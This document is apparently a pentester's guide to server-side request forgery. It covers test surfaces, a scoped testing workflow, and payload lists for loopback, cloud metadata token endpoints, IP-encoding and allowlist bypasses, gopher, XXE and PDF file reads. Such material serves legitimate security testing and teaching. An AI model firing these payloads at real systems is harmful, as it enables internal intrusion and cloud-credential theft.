# Server-Side Request Forgery — SSRF

## Introduction

Server-Side Request Forgery, usually shortened to **SSRF**, is a vulnerability where user-controlled input influences a request made by the server. Instead of the attacker’s browser connecting directly to the target, the vulnerable application becomes the HTTP client.

The key idea:

```text
Attacker input  →  vulnerable server-side fetcher  →  internal/external target
```

This is dangerous because the server may have network access, firewall permissions, credentials, trust relationships, DNS visibility, or cloud metadata access that the attacker does not have directly.

SSRF can lead to:

* access to internal-only admin panels
* internal network reconnaissance
* cloud metadata exposure
* theft of temporary cloud credentials
* local file access in some URL-fetching libraries
* interaction with internal services such as Redis, Elasticsearch, Docker API, Jenkins, Consul, Kubernetes APIs, SMTP, Memcached, or databases
* bypassing firewall, VPN, ACL, or reverse-proxy restrictions
* in some cases, remote code execution through chained internal services

---

## Useful Resources

* [PortSwigger SSRF](https://portswigger.net/web-security/ssrf)
* [HackTricks SSRF](https://hacktricks.wiki/en/pentesting-web/ssrf-server-side-request-forgery/index.html)
* [HackTricks URL Format Bypass](https://hacktricks.wiki/en/pentesting-web/ssrf-server-side-request-forgery/url-format-bypass.html)
* [HackTricks Cloud SSRF](https://hacktricks.wiki/en/pentesting-web/ssrf-server-side-request-forgery/cloud-ssrf.html)
* [Incendium SSRF Notes](https://notes.incendium.rocks/pentesting-notes/web/ssrf)
* [OWASP WSTG SSRF Testing](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/19-Testing_for_Server-Side_Request_Forgery)
* [OWASP SSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)
* [OWASP Top 10 A10:2021 SSRF](https://owasp.org/Top10/2021/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/)
* [PayloadsAllTheThings SSRF](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery)

---

## Basics

Most SSRF testing is about answering five questions:

1. **Can I control a destination?**
   Example: full URL, hostname, path, image URL, webhook URL, import URL.

2. **Does the server make the request?**
   Confirm with a unique external listener such as Burp Collaborator, interactsh, webhook.site, requestrepo, or Canarytokens.

3. **Can I see the response?**
   If yes, it is in-band SSRF. If no, it may still be blind SSRF.

4. **Where can the server reach from its network position?**
   Loopback, private RFC1918 ranges, link-local metadata, service mesh, Kubernetes, internal APIs, admin panels.

5. **Can I bypass validation?**
   Test parser confusion, redirects, DNS tricks, encoded IPs, alternative schemes, URL fragments, userinfo, and allowlist mistakes.

A vulnerable flow often looks like this:

```text
User submits:
    stockApi=http://example.com/api/stock?id=1

Server does:
    GET http://example.com/api/stock?id=1

Attacker changes it to:
    stockApi=http://127.0.0.1/admin

Server does:
    GET http://127.0.0.1/admin
```

---

## Main SSRF Types

| Type                  | Meaning                                                            | Typical signal                                                         |
| --------------------- | ------------------------------------------------------------------ | ---------------------------------------------------------------------- |
| In-band SSRF          | Backend response is returned to the attacker.                      | Internal page, JSON, error, banner, metadata appears in the response.  |
| Blind SSRF            | Server makes the request, but response is not returned.            | DNS/HTTP callback to Collaborator/interactsh/webhook.site.             |
| Semi-blind SSRF       | No body is returned, but status, length, timing, or error changes. | Different response time, status code, redirect, or exception.          |
| Localhost SSRF        | Server connects to itself through loopback.                        | `127.0.0.1`, `localhost`, `[::1]`, `0`, `127.1`.                       |
| Internal network SSRF | Server reaches RFC1918/private services.                           | `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`.                       |
| Cloud metadata SSRF   | Server reaches cloud instance metadata service.                    | `169.254.169.254`, `metadata.google.internal`, Azure/GCP/AWS metadata. |
| Protocol SSRF         | Fetcher supports non-HTTP schemes.                                 | `file://`, `gopher://`, `dict://`, `ftp://`, `ldap://`, `sftp://`.     |
| Parser confusion SSRF | Validator and HTTP client parse the URL differently.               | `@`, `#`, backslashes, encoded characters, nested domains.             |
| Second-order SSRF     | Payload is stored first and fetched later.                         | Profile images, invoices, PDF exports, admin previews, webhooks.       |

---

## Where to Test

Test every place where user-controlled input may become a server-side request.

| Location                | Examples                                                                        |
| ----------------------- | ------------------------------------------------------------------------------- |
| URL query parameters    | `?url=`, `?next=`, `?redirect=`, `?image=`, `?callback=`, `?feed=`              |
| POST form fields        | avatar URL, website URL, import URL, stock API, webhook target                  |
| JSON body               | `{ "url": "https://example.com" }`                                              |
| GraphQL variables       | image importers, link previews, integrations                                    |
| Multipart fields        | file metadata, remote file import, image upload by URL                          |
| Headers                 | `Host`, `Referer`, `X-Forwarded-Host`, `X-Original-URL`, custom webhook headers |
| XML/SVG/HTML input      | XXE, external images, CSS `url()`, SVG external references                      |
| Markdown/HTML renderers | image fetches, link previews, Open Graph preview generation                     |
| PDF generators          | `<img>`, `<iframe>`, `<link rel="stylesheet">`, CSS `url()`                     |
| Webhook integrations    | Slack/Discord/webhook tester URLs                                               |
| OAuth/SAML/OIDC fields  | `redirect_uri`, `jwks_uri`, metadata URL, discovery URL                         |
| API clients             | OpenAPI import, Postman collection import, Swagger URL import                   |
| Admin panels            | integrations, notification URLs, monitoring targets                             |
| Background jobs         | reports, invoices, crawlers, screenshot services                                |

High-value parameter names:

```text
url
uri
path
dest
destination
redirect
redirect_url
next
return
returnUrl
callback
callback_url
webhook
webhook_url
image
image_url
avatar
avatar_url
file
file_url
document
feed
feed_url
rss
api
api_url
stockApi
host
hostname
domain
site
website
endpoint
proxy
target
link
preview
template
reference
```

---

## Safe Testing Workflow

1. Confirm scope and authorization.
2. Capture a baseline request and response.
3. Change only one parameter at a time.
4. Use a unique marker in every payload, for example:

```text
ssrf-probe-73921
```

5. Start with your own external listener before testing internal addresses:

```text
http://ssrf-probe-73921.your-oast-domain.example/ping
```

6. Check whether the listener receives:

   * DNS lookup
   * HTTP request
   * HTTPS request
   * source IP
   * User-Agent
   * headers
   * path and query string

7. Test harmless internal endpoints first:

   * `/`
   * `/health`
   * `/status`
   * `/robots.txt`
   * `/favicon.ico`

8. Compare:

   * HTTP status code
   * response length
   * page content
   * redirect behavior
   * error message
   * timing
   * DNS-only callbacks
   * HTTP callbacks

9. Avoid destructive actions:

   * no broad internal scanning unless allowed
   * no POST/PUT/DELETE to internal services unless explicitly allowed
   * no cloud credential use outside the rules of engagement
   * no high-concurrency time-based scanning on production

10. Prove impact with minimal evidence, not full data extraction.

---

## First Probe Payloads

Start with controlled external callbacks.

```text
http://ssrf-probe-73921.oast.example/
https://ssrf-probe-73921.oast.example/
http://ssrf-probe-73921.oast.example/path?source=stockApi
https://ssrf-probe-73921.oast.example/ssrf-test
```

Try different schemes if allowed:

```text
http://
https://
ftp://
file://
gopher://
dict://
ldap://
sftp://
tftp://
```

Good confirmation signals:

* your OAST server receives DNS only
* your OAST server receives HTTP request
* the backend response is reflected
* application error contains connection details
* request time changes
* status code changes
* backend fetcher User-Agent appears
* application follows redirects to your second URL
* SSRF source IP belongs to cloud, container, NAT, or internal infrastructure

---

## Basic Localhost Payloads

Try common loopback forms:

```text
http://127.0.0.1/
http://127.0.0.1:80/
http://127.0.0.1:443/
http://127.0.0.1:8080/
http://localhost/
http://localhost:8080/
http://127.1/
http://0/
http://0.0.0.0/
http://[::1]/
http://[0000::1]/
http://[0:0:0:0:0:ffff:127.0.0.1]/
```

Useful loopback ports to check carefully:

```text
22      SSH banner only, usually no HTTP response
25      SMTP
80      HTTP
443     HTTPS
5000    Flask / development APIs
5601    Kibana
8000    development servers
8080    proxy/admin/dev app
8081    alternative web app
8443    HTTPS admin app
9000    PHP-FPM / app service / SonarQube depending on context
9200    Elasticsearch
2375    Docker API, very sensitive
10250   Kubernetes kubelet, very sensitive
```

Do not perform destructive requests against sensitive internal services.

---

## Internal Network Payloads

Common RFC1918/private network targets:

```text
http://10.0.0.1/
http://10.10.10.10/
http://172.16.0.1/
http://172.17.0.1/
http://172.18.0.1/
http://192.168.0.1/
http://192.168.1.1/
```

Container and Kubernetes environments often expose interesting local networks:

```text
http://172.17.0.1/
http://10.96.0.1/
https://kubernetes.default.svc/
https://kubernetes.default.svc.cluster.local/
```

Service discovery names worth testing only in authorized environments:

```text
http://localhost/
http://admin/
http://api/
http://internal/
http://backend/
http://gateway/
http://consul.service.consul/
http://vault.service.consul/
http://kubernetes.default.svc/
```

---

## Cloud Metadata SSRF

Cloud metadata SSRF is one of the highest-impact SSRF classes. Metadata endpoints are normally reachable only from inside the instance or workload.

### AWS EC2 Metadata

Base endpoint:

```text
http://169.254.169.254/
http://169.254.169.254/latest/meta-data/
```

Common low-impact discovery endpoints:

```text
http://169.254.169.254/latest/meta-data/ami-id
http://169.254.169.254/latest/meta-data/instance-id
http://169.254.169.254/latest/meta-data/instance-type
http://169.254.169.254/latest/meta-data/placement/region
http://169.254.169.254/latest/dynamic/instance-identity/document
```

IAM role discovery:

```text
http://169.254.169.254/latest/meta-data/iam/
http://169.254.169.254/latest/meta-data/iam/info
http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

AWS IMDSv2 requires a token obtained with a `PUT` request and then reused in the `X-aws-ec2-metadata-token` header. This makes exploitation harder when the SSRF primitive can only send simple GET requests.

### AWS ECS / Containers

ECS task credentials often use:

```text
http://169.254.170.2/v2/credentials/<GUID>
```

The path may be stored in:

```text
AWS_CONTAINER_CREDENTIALS_RELATIVE_URI
```

If an SSRF is combined with local file read, `/proc/self/environ` may expose useful environment variables. Treat this as high impact.

### GCP Metadata

GCP metadata usually requires this header:

```text
Metadata-Flavor: Google
```

Base endpoints:

```text
http://metadata.google.internal/
http://metadata/
http://169.254.169.254/
```

Common discovery endpoints:

```text
http://metadata.google.internal/computeMetadata/v1/project/project-id
http://metadata.google.internal/computeMetadata/v1/project/numeric-project-id
http://metadata.google.internal/computeMetadata/v1/instance/name
http://metadata.google.internal/computeMetadata/v1/instance/hostname
http://metadata.google.internal/computeMetadata/v1/instance/zone
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/
```

Service account token endpoint:

```text
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
```

### Azure Metadata

Azure metadata usually requires this header:

```text
Metadata: true
```

Base endpoint:

```text
http://169.254.169.254/metadata/instance?api-version=2021-02-01
```

Managed identity token endpoint shape:

```text
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=<resource>
```

Azure metadata requests must not include `X-Forwarded-For`.

### Cloud Testing

For cloud SSRF proof, prefer minimal evidence first:

```text
instance-id
region
project-id
role name
service account email
metadata service reachable / not reachable
```

Do not use temporary credentials unless the engagement scope explicitly allows it.

---

## Bypassing SSRF Defenses

SSRF filters are often bypassable because URL parsing is surprisingly complex. The validator, reverse proxy, framework, DNS resolver, and HTTP client may not agree on what the final destination is.

---

## Denylist Bypasses

A denylist might block strings such as:

```text
localhost
127.0.0.1
169.254.169.254
/admin
```

Try alternative loopback representations:

```text
http://127.1/
http://127.0.1/
http://127.000000000000.1/
http://0/
http://0.0.0.0/
http://[::1]/
```

Decimal IP:

```text
http://2130706433/        # 127.0.0.1
http://3232235521/        # 192.168.0.1
http://3232235777/        # 192.168.1.1
```

Octal IP:

```text
http://0177.0000.0000.0001/
http://017700000001/
```

Hex IP:

```text
http://0x7f000001/
http://0xc0a80001/
```

Mixed notation:

```text
http://0x7f.0.0.1/
http://127.0x00.0000.1/
```

Unicode / alternative dot:

```text
http://127。0。0。1/
http://127%E3%80%820%E3%80%820%E3%80%821/
```

DNS names resolving to local or private addresses:

```text
http://127.0.0.1.nip.io/
http://customer1.app.127.0.0.1.nip.io/
http://localtest.me/
```

Encoding tricks:

```text
http://local%68ost/
http://127.0.0.1/%61dmin
http://127.0.0.1/%2561dmin
```

Case variation:

```text
http://LocalHost/
http://LOCALHOST/
```

---

## Allowlist Bypasses

Allowlist mistakes often happen when the application checks whether the input “starts with” or “contains” a trusted domain.

Assume the allowed domain is:

```text
trusted.example.com
```

Userinfo confusion:

```text
https://trusted.example.com@attacker.example/
https://trusted.example.com:password@attacker.example/
```

Subdomain confusion:

```text
https://trusted.example.com.attacker.example/
```

Fragment confusion:

```text
https://attacker.example#trusted.example.com
https://attacker.example%23trusted.example.com
```

Query confusion:

```text
https://attacker.example/?next=trusted.example.com
```

Path confusion:

```text
https://attacker.example/trusted.example.com
https://attacker.example\trusted.example.com/
https://attacker.example/.trusted.example.com
```

Null byte / newline style confusion:

```text
https://attacker.example%00trusted.example.com
https://attacker.example%0Atrusted.example.com
```

Parameter pollution:

```text
next=trusted.example.com&next=http://127.0.0.1/admin
```

Path traversal when only a path is controlled:

```text
x/../private
safe/../../admin
%2e%2e/%2e%2e/admin
```

---

## Redirect-Based Bypass

If the application validates only the first URL and then follows redirects, an attacker-controlled redirect can point the server to a blocked destination.

Example:

```text
https://trusted.example.com/redirect?to=http://127.0.0.1/admin
```

or:

```text
https://attacker.example/redirect-to-localhost
```

Server-side redirect response:

```http
HTTP/1.1 302 Found
Location: http://127.0.0.1/admin
```

Test different redirect codes:

```text
301
302
303
307
308
```

Also test redirecting between schemes:

```text
https://allowed.example/redirect → http://127.0.0.1/
http://allowed.example/redirect  → gopher://127.0.0.1:80/_
```

A secure fetcher should either disable redirects or revalidate every redirect destination after DNS resolution.

---

## DNS Rebinding / DNS Pinning Issues

DNS rebinding abuses time-of-check/time-of-use differences.

Typical idea:

```text
1. Validator resolves attacker.example to a public IP.
2. Application accepts the URL.
3. Later, HTTP client resolves the same domain again.
4. DNS now returns 127.0.0.1, 10.x.x.x, 169.254.169.254, or another internal IP.
```

Potential test domains:

```text
attacker-controlled-domain.example
low-TTL DNS record
A record changes from public IP to private IP
```

Defensive expectation:

```text
resolve once
verify all A/AAAA records
reject private/link-local/loopback/multicast/reserved ranges
connect to the verified IP
send the expected Host header explicitly
revalidate after redirects
```

---

## Parser Confusion Payloads

URL parsers may disagree about scheme, host, path, userinfo, fragments, slashes, and backslashes.

Try:

```text
https:attacker.example
https:/attacker.example
//attacker.example
/\/attacker.example/
\\/\/attacker.example/
@attacker.example
#attacker.example
#%20@attacker.example
http://169.254.169.254\@attacker.example/
http://localhost:\@trusted.example/../
```

Interesting characters:

```text
@
#
?
\
/
;
:
%00
%0a
%0d%0a
%E3%80%82
```

Always compare how the application validates the URL with how the backend HTTP client actually requests it.

---

## Protocol-Based SSRF

Some URL fetchers support more than HTTP/HTTPS. Non-HTTP schemes can significantly increase impact.

### file://

May read local files if the library allows it.

```text
file:///etc/passwd
file:///c:/windows/win.ini
```

### dict://

Can be used to speak to text-based TCP services.

```text
dict://127.0.0.1:11211/stats
```

### gopher://

Gopher can send raw bytes to arbitrary TCP services. This can sometimes transform SSRF from “read a URL” into “speak a protocol.”

Simple HTTP-over-gopher probe:

```text
gopher://127.0.0.1:8080/_GET%20/%20HTTP/1.1%0D%0AHost:%20127.0.0.1%0D%0A%0D%0A
```

Simple SMTP banner-style probe:

```text
gopher://127.0.0.1:25/_HELO%20localhost%0D%0AQUIT%0D%0A
```

Use protocol payloads carefully. Payloads that mutate Redis, databases, mail servers, Docker, or internal APIs should only be used when explicitly authorized.

### ftp://, sftp://, tftp://

These may trigger outbound connections useful for blind SSRF detection, protocol fingerprinting, or egress testing.

```text
ftp://attacker.example/test
sftp://attacker.example:2222/test
tftp://attacker.example:69/test
```

### ldap://

Can sometimes interact with LDAP or text-based services depending on library behavior.

```text
ldap://127.0.0.1:389/
```

---

## SSRF via Host Header

Host header issues appear when reverse proxies, caches, routers, or back-end frameworks trust the supplied `Host` value.

Basic test:

```http
GET / HTTP/1.1
Host: attacker.example
```

Line wrapping / duplicate-style test:

```http
GET / HTTP/1.1
 Host: attacker.example
Host: vulnerable.example
```

Absolute URL request-line test:

```http
GET http://127.0.0.1:8080/ HTTP/1.1
Host: vulnerable.example
Connection: close
```

Potential signals:

* backend fetches attacker-controlled host
* password reset links use attacker host
* cache poisoning behavior
* proxy forwards absolute-form URL
* internal response is returned instead of normal public response

---

## SSRF via Referer Header

Some analytics, link-preview, anti-fraud, or logging systems fetch URLs found in `Referer`.

Example:

```http
GET /product/1 HTTP/2
Host: vulnerable.example
Referer: http://ssrf-probe-73921.oast.example/
```

This is often blind. Check your OAST listener for DNS/HTTP callbacks.

Other headers worth testing in authorized environments:

```text
Referer
Origin
X-Forwarded-Host
X-Forwarded-For
X-Original-URL
X-Rewrite-URL
X-Forwarded-Scheme
X-Forwarded-Proto
X-Real-IP
Forwarded
```

---

## SSRF via XML / XXE

If the application parses XML, external entities may trigger server-side requests.

Example shape:

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "http://ssrf-probe-73921.oast.example/xxe">
]>
<root>&xxe;</root>
```

Potential targets:

```text
http://127.0.0.1/
http://169.254.169.254/
file:///etc/passwd
```

XXE may cause SSRF, local file read, or both depending on parser settings.

---

## SSRF via SVG / HTML / Markdown

Renderers may fetch external resources while generating previews.

SVG example:

```xml
<svg xmlns="http://www.w3.org/2000/svg">
  <image href="http://ssrf-probe-73921.oast.example/svg" />
</svg>
```

HTML example:

```html
<img src="http://ssrf-probe-73921.oast.example/img">
<link rel="stylesheet" href="http://ssrf-probe-73921.oast.example/style.css">
<iframe src="http://ssrf-probe-73921.oast.example/frame"></iframe>
```

CSS example:

```css
body {
  background-image: url("http://ssrf-probe-73921.oast.example/css");
}
```

Markdown example:

```markdown
![probe](http://ssrf-probe-73921.oast.example/markdown)
```

Look especially at:

* profile rendering
* rich text editors
* admin previews
* PDF export
* invoice generation
* ticketing systems
* email template previews
* Open Graph / URL preview fetchers

---

## SSRF via PDF Generators

HTML-to-PDF tools are common blind SSRF gadgets. They may fetch images, stylesheets, fonts, iframes, or scripts during rendering.

Basic probe:

```html
<html>
  <body>
    <img src="http://ssrf-probe-73921.oast.example/pdf-img">
  </body>
</html>
```

Internal probe:

```html
<html>
  <body>
    <img src="http://127.0.0.1:8080/health">
    <link rel="stylesheet" href="http://10.0.0.5/admin">
  </body>
</html>
```

Local file probe where explicitly allowed:

```html
<iframe src="file:///etc/passwd" width="400" height="400"></iframe>
<iframe src="file:///c:/windows/win.ini" width="400" height="400"></iframe>
```

Possible signals:

* OAST callback
* generated PDF contains fetched content
* broken image icon differs
* render time changes
* PDF generation fails with connection error
* internal page content appears in the PDF

---

## Blind SSRF

Blind SSRF occurs when the server makes the request but does not return the response body.

Tools for confirmation:

```text
Burp Collaborator
interactsh
Canarytokens
webhook.site
requestrepo
pingb
custom VPS with HTTP/DNS logs
```

Test with unique paths:

```text
http://ssrf-probe-73921.oast.example/from-stockApi
http://ssrf-probe-73921.oast.example/from-avatar
http://ssrf-probe-73921.oast.example/from-pdf
```

Check:

```text
DNS callback only      → server resolved the domain
HTTP callback         → server connected over HTTP
HTTPS callback        → server connected over HTTPS
source IP             → where the request came from
User-Agent            → library, framework, bot, renderer
headers               → internal service identity or proxy details
request path/query    → whether input is preserved
```

Blind SSRF can still be exploitable through:

* internal port scanning by timing
* known vulnerable internal services
* cloud metadata requests
* redirect chains
* PDF renderers
* protocol-specific side effects
* logs visible in another panel
* second-order fetches by admin or worker process

---

## Timing-Based Internal Port Checks

When the response body is not visible, timing may still reveal whether a port is open, closed, filtered, or slow.

Example target list:

```text
http://127.0.0.1:80/
http://127.0.0.1:443/
http://127.0.0.1:8080/
http://127.0.0.1:9200/
```

Signals:

```text
fast error       → connection refused or blocked
slow timeout     → filtered or blackholed
fast normal      → service answered
different length → application handled backend response differently
different error  → connect vs read timeout vs TLS error
```

Keep timing tests low-rate and narrow. Do not scan large internal ranges unless scope explicitly permits it.

---

## Common Internal Service Targets

Use this table for recognition and impact assessment, not for destructive testing.

| Service             |                Common port | SSRF risk                                              |
| ------------------- | -------------------------: | ------------------------------------------------------ |
| HTTP admin panels   | 80, 8080, 8081, 8000, 8443 | Access to internal-only interfaces                     |
| Elasticsearch       |                       9200 | Data exposure, cluster metadata                        |
| Kibana              |                       5601 | Internal dashboard access                              |
| Redis               |                       6379 | Dangerous if unauthenticated and writable              |
| Memcached           |                      11211 | Data exposure or internal state                        |
| Docker API          |                       2375 | Critical if unauthenticated                            |
| Kubernetes API      |                  6443, 443 | Cluster control if token/trust exists                  |
| Kubelet             |                      10250 | Node/pod data, possible exec in bad configs            |
| Consul              |                       8500 | Service discovery, KV data                             |
| Vault               |                       8200 | Secrets if reachable and authenticated through context |
| Jenkins             |                       8080 | CI access, possible RCE if misconfigured               |
| Solr                |                       8983 | Admin/API exposure                                     |
| RabbitMQ Management |                      15672 | Message broker admin                                   |
| Prometheus          |                       9090 | Metrics, service discovery data                        |
| Grafana             |                       3000 | Dashboard/data-source exposure                         |
| SMTP                |                    25, 587 | Banner/internal domain leakage, mail abuse risk        |

---

## Response Analysis

When testing SSRF, compare more than visible content.

| Signal                       | Meaning                                                                         |
| ---------------------------- | ------------------------------------------------------------------------------- |
| Different status code        | Backend request probably changed behavior.                                      |
| Different response length    | Internal response may be embedded or error changed.                             |
| Different error message      | Useful for protocol, DNS, TLS, or connection fingerprinting.                    |
| Redirect appears             | Backend may follow or expose redirects.                                         |
| Timeout                      | Host/port may be filtered or slow.                                              |
| Immediate connection refused | Host reachable but port closed.                                                 |
| TLS error                    | Service exists but expects TLS or certificate validation failed.                |
| DNS callback only            | App resolves but may not connect.                                               |
| HTTP callback                | Confirmed outbound HTTP request.                                                |
| User-Agent leaked            | Identifies library such as curl, Java, Python requests, Go client, wkhtmltopdf. |

---

## SSRF Chaining Ideas

SSRF is often a pivot, not the final bug.

Common chains:

```text
SSRF → internal admin panel
SSRF → cloud metadata → temporary credentials
SSRF → PDF renderer → internal file/resource fetch
SSRF → open redirect → filter bypass
SSRF → Host header abuse → proxy routing issue
SSRF → internal port scan → exposed service
SSRF → gopher → internal text protocol
SSRF + LFI → read env vars → cloud/container credentials
SSRF + cache poisoning → stored impact
SSRF + weak service auth → RCE
```

Impact depends on:

* network position of the vulnerable server
* outbound egress rules
* service mesh / internal DNS
* cloud provider
* metadata protection
* available HTTP methods
* allowed schemes
* redirect behavior
* whether response is visible
* internal services reachable from the server

---


## Manual SSRF Checklist

### Discovery

- [ ] Confirmed scope and authorization.
- [ ] Identified all URL-like parameters.
- [ ] Checked query parameters, form fields, JSON, GraphQL, multipart metadata, cookies, and headers.
- [ ] Looked for webhooks, imports, avatar fetchers, URL previews, PDF exports, XML/SVG parsing, and admin previews.
- [ ] Used a unique marker before active SSRF payloads.

### External Confirmation

- [ ] Sent HTTP and HTTPS OAST payloads.
- [ ] Checked DNS callbacks.
- [ ] Checked HTTP callbacks.
- [ ] Recorded source IP, User-Agent, headers, path, and query string.
- [ ] Tested whether redirects are followed.

### In-Band SSRF

- [ ] Tested harmless loopback URLs.
- [ ] Tested harmless private-network URLs in scope.
- [ ] Compared status, length, content, errors, and redirects.
- [ ] Confirmed whether backend responses are reflected.

### Blind SSRF

- [ ] Used unique OAST paths per parameter.
- [ ] Tested Referer and Host header surfaces.
- [ ] Tested PDF/HTML/SVG/Markdown renderers.
- [ ] Used timing carefully for a small set of ports.
- [ ] Avoided broad scans unless explicitly authorized.

### Bypass Testing

- [ ] Tested alternative localhost forms.
- [ ] Tested decimal, octal, hex, shortened, and IPv6 IP forms.
- [ ] Tested URL encoding and double encoding.
- [ ] Tested userinfo with `@`.
- [ ] Tested fragments with `#`.
- [ ] Tested backslash/slash parser confusion.
- [ ] Tested open redirects.
- [ ] Tested DNS rebinding only when allowed.
- [ ] Tested path traversal when only partial URL/path is controlled.
- [ ] Tested non-HTTP schemes only when allowed.

### Cloud

- [ ] Checked whether metadata endpoint is reachable.
- [ ] Identified provider: AWS, GCP, Azure, DigitalOcean, container platform.
- [ ] Retrieved minimal proof only, such as instance ID, project ID, region, or role name.
- [ ] Did not use temporary credentials unless explicitly authorized.
- [ ] Documented whether IMDSv2 or metadata headers are required.


## Quick Payload Bank

External callback:

```text
http://ssrf-probe-73921.oast.example/
https://ssrf-probe-73921.oast.example/
```

Loopback:

```text
http://127.0.0.1/
http://localhost/
http://127.1/
http://0/
http://[::1]/
```

Private:

```text
http://10.0.0.1/
http://172.16.0.1/
http://192.168.1.1/
```

Metadata:

```text
http://169.254.169.254/
http://metadata.google.internal/
http://metadata/
```

Encoded localhost:

```text
http://2130706433/
http://017700000001/
http://0x7f000001/
```

Allowlist confusion:

```text
https://trusted.example.com@attacker.example/
https://trusted.example.com.attacker.example/
https://attacker.example#trusted.example.com
https://attacker.example%23trusted.example.com
```

Redirect:

```text
https://attacker.example/redirect?to=http://127.0.0.1/
```

Path traversal:

```text
x/../private
safe/../../admin
%2e%2e/%2e%2e/admin
```

PDF / HTML:

```html
<img src="http://ssrf-probe-73921.oast.example/img">
<link rel="stylesheet" href="http://ssrf-probe-73921.oast.example/style.css">
<iframe src="http://ssrf-probe-73921.oast.example/frame"></iframe>
```

Gopher HTTP probe:

```text
gopher://127.0.0.1:8080/_GET%20/%20HTTP/1.1%0D%0AHost:%20127.0.0.1%0D%0A%0D%0A
```

Referer:

```http
GET / HTTP/1.1
Host: vulnerable.example
Referer: http://ssrf-probe-73921.oast.example/referer
```

Host header:

```http
GET http://127.0.0.1:8080/ HTTP/1.1
Host: vulnerable.example
Connection: close
```

---